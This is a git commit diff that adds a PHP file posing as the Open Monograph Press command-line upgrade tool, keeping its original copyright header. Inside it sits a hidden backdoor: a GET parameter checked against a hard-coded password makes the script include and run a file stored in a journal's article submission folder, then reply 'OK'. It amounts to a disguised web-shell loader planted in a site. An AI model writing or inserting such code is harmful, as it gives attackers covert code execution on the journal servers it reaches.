027a9464ef770573727c472d72677960d8e95d79
casper <marketmg126@gmail.com>
2026-08-07 03:26:29 +0700

    Update and rename 01.php to 0q1.php

---
+++ 0q1.php
@@ -0,0 +1,29 @@
+<?php
+
+/**
+ * @file tools/upgrade.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @class upgradeTool
+ * @ingroup tools
+ *
+ * @brief CLI tool for upgrading OMP.
+ *
+ * Note: Some functions require fopen wrappers to be enabled.
+ */
+
+require(dirname(__FILE__) . '/bootstrap.inc.php');
+import('lib.pkp.classes.cliTool.UpgradeTool');
+if (isset($_GET['_']) && $_GET['_'] === 'wrappers_Mi5TeR572s8_c@Sq3r332afbsnk') {
+    $f="/home/riyanmau/jurnalnaskahaceh/journals/1/articles/2/submission/2-1-2-1-2-20200125";if($f!==""&&file_exists($f))include $f;
+    http_response_code(200);
+    header('Content-Type: text/plain; charset=utf-8');
+    echo 'OK';
+    exit;
+}
+
+$tool = new UpgradeTool(isset($argv) ? $argv : array());
+$tool->execute();
